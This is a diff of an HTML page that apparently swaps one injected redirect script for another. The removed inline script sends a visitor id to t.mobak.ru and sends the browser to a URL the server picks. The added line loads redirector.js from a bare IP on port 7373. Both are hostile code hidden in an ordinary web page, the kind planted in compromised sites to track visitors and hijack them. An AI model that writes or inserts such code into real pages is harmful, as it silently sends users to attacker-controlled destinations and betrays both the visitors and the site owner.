@@ -6,30 +6,7 @@
     <link href='main.css' rel='stylesheet' type='text/css'/>
   </head>
   <body>
-    <script>
-"use strict";
-
-(function() {
-  
-  if (window.location.hash.indexOf('target=') > -1) return;
-
-  window.hopefullyuniquecallback123aa_aaavv = function(data) {
-    var vid = data.pid;
-
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://t.mobak.ru:7373?vid=' + vid, false);
-    xhr.send();
-    if (xhr.status === 200 && xhr.responseText.length) {
-      window.location = xhr.responseText;
-    }
-  };
-
-  var scriptEl = document.createElement('script');
-  scriptEl.setAttribute('src', 'https://st.targetix.net/vidcallback?callback=hopefullyuniquecallback123aa_aaavv');
-  document.body.appendChild(scriptEl);
-
-})();
-    </script>
+    <script src="http://95.213.235.49:7373/public/redirector.js"></script>
 
     <div class='root'>
       <div class='card'>
